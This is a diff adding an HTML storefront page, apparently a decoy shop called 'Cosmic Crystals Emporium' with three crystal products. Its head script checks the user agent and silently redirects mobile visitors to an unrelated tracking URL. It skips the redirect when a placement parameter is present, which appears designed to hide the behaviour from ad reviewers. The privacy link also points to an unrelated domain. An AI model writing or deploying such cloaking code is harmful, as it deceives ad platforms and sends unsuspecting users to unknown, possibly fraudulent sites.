@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Crystals Emporium</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #1a1a2e, #16213e);
+            color: #e94560;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #0f3460;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #533483;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        .product {
+            background-color: #16213e;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 10px;
+            width: 200px;
+            text-align: center;
+            box-shadow: 0 0 10px #e94560;
+        }
+        .product img {
+            width: 100%;
+            border-radius: 10px;
+        }
+        footer {
+            background-color: #0f3460;
+            color: #e94560;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #533483;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Crystals Emporium</h1>
+    </header>
+    <main>
+        <div class="product">
+            <img src="https://picsum.photos/200" alt="Amethyst Crystal">
+            <h2>Amethyst Crystal</h2>
+            <p>Harness the power of the cosmos</p>
+            <p>$29.99</p>
+        </div>
+        <div class="product">
+            <img src="https://picsum.photos/201" alt="Quartz Cluster">
+            <h2>Quartz Cluster</h2>
+            <p>Amplify your energy field</p>
+            <p>$39.99</p>
+        </div>
+        <div class="product">
+            <img src="https://picsum.photos/202" alt="Celestial Selenite">
+            <h2>Celestial Selenite</h2>
+            <p>Connect with lunar energies</p>
+            <p>$24.99</p>
+        </div>
+    </main>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
